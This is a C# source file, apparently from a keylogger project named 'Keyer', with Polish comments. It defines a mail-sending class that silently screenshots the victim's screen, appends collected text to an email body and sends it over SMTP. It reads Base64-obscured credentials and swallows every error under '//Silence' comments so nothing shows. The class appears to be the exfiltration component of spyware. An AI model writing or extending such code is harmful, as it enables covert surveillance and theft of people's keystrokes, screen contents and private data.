using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Mail;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.IO;

namespace Keyer
{
    class MailManager // Klasa obsługująca wysyłanie maili
    {
        private MailMessage mail = new MailMessage(); //Obiekty mail i smtp do obsłużenia polecenia
        private SmtpClient smtp = new SmtpClient();

        private string from; // Zmienne na wiadomość
        private string to;
        private string subject;
        private Boolean bodyHTML;
        private string body;
        private string att;

        private string host; // Zmienne na dane do wysyłania przez smtp
        private int port;
        private Boolean defaultCredentials = false;
        private string login;
        private string password;
        private string encrypted = ""; //Zmienna na rodzaj szyfrowania loginu i hasła smtp (domyslnie pusta)
        private Boolean ssl;
        private int timeout = 180; //Maksymalne opoznienie w wysylanie maila (W sekundach)

        public void setFrom(string from) // Gettery i Settery dla maila
        {
            this.from = from;
            this.mail.From = new MailAddress(this.from);
        }
        public string getFrom()
        {
            return this.from;
        }

        public void setTo(string to)
        {
            this.to = to;
            this.mail.To.Add(new MailAddress(this.to));
        }
        public string getTo()
        {
            return this.to;
        }

        public void setSubject(string subject)
        {
            this.subject = subject;
            this.mail.Subject = this.subject;
        }
        public string getSubject()
        {
            return this.subject;
        }

        public void setBodyHTML(Boolean bodyHTML)
        {
            this.bodyHTML = bodyHTML;
            this.mail.IsBodyHtml = this.bodyHTML;
        }
        public Boolean getBodyHTML()
        {
            return this.bodyHTML;
        }

        public void setBody(string body)
        {
            this.body = body;
            this.mail.Body = this.body;
        }
        public string getBody()
        {
            return this.body;
        }
        public void pushBody(string addbody)
        {
            this.body += addbody;
            this.mail.Body = this.body;
        }
        public void clearBody()
        {
            this.mail.Body = String.Empty;
        }

        public void setAtt(string att)
        {
            if (att != string.Empty)
            {
                try
                {
                    this.att = att;
                    Attachment data = new Attachment(this.att);
                    this.mail.Attachments.Add(data);
                }
                catch (Exception)
                {
                    //Silence
                }
            }
        }

        public void setAttScrn() //Robienie screena i zamieszczanie go w załączniku
        {
            try
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppRgb); //Nitmapa na screenshot
                Graphics screenshot = Graphics.FromImage(bmp);
                MemoryStream memoryStream = new MemoryStream();

                screenshot.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                bmp.Save(memoryStream, ImageFormat.Jpeg);

                memoryStream.Position = 0;
                Attachment data = new Attachment(memoryStream, "screenshot.jpg", "image/jpeg");
                this.mail.Attachments.Add(data);
            }
            catch (Exception)
            {
                //Silence
            }
        }

        public string getAtt()
        {
            return this.att;
        }
        public void clearAtt()
        {
            this.mail.Attachments.Clear();
        }

        public void setHost(string host) // Gettery i Settery dla SMTP
        {
            this.host = host;
            this.smtp.Host = this.host;
        }
        public string getHost()
        {
            return this.host;
        }

        public void setPort(int port)
        {
            this.port = port;
            this.smtp.Port = this.port;
        }
        public int getPort()
        {
            return this.port;
        }

        public void setDefaultCredentials(Boolean defaultCredentials = false) 
        {
            this.defaultCredentials = defaultCredentials;
            this.smtp.UseDefaultCredentials = this.defaultCredentials;
        }
        public Boolean getDefaultCredentialst()
        {
            return this.defaultCredentials;
        }

        public void setCredentials(string login, string password, string encrypted = "") //Trzeci parametr jako rodzaj szyfrowania (domyslnie bez szyfrowania)
        {
            this.encrypted = encrypted;

            switch (encrypted)
            {
                case "":
                    this.login = login;
                    this.password = password;
                    this.smtp.Credentials = new NetworkCredential(this.login, this.password);
                break;

                case "Base64": //Odkodowywanie w Base64
                    byte[] a = System.Convert.FromBase64String(login);
                    this.login = System.Text.Encoding.ASCII.GetString(a);

                    byte[] b = System.Convert.FromBase64String(password);
                    this.password = System.Text.Encoding.ASCII.GetString(b);

                    this.smtp.Credentials = new NetworkCredential(this.login, this.password);
                break;

                default:
                    // Domyślnie nic, tryb "silence"
                break;
            }
        }
        public string getCredentials()
        {
            return this.login + " " + this.password;
        }

        public void setSsl(Boolean ssl)
        {
            this.ssl = ssl;
            this.smtp.EnableSsl = this.ssl;
        }
        public Boolean getSsl()
        {
            return this.ssl;
        }

        public void setTimeout(int timeout)
        {
            this.timeout = timeout*1000;
            this.smtp.Timeout = this.timeout;
        }
        public int getTimeout()
        {
            return this.timeout;
        }

        public void send() // Wysyłanie maila (parametr time słuzy do odliczania czasu do wysłania następnego maila przykładowo, gdy wysyłanie ma znajdować się w pętli. Domyslnie to wartość 0)
        {
            try
            {
                this.smtp.Send(mail);
            }
            catch (Exception e)
            {
                //Silence
            }      
        }
    }
}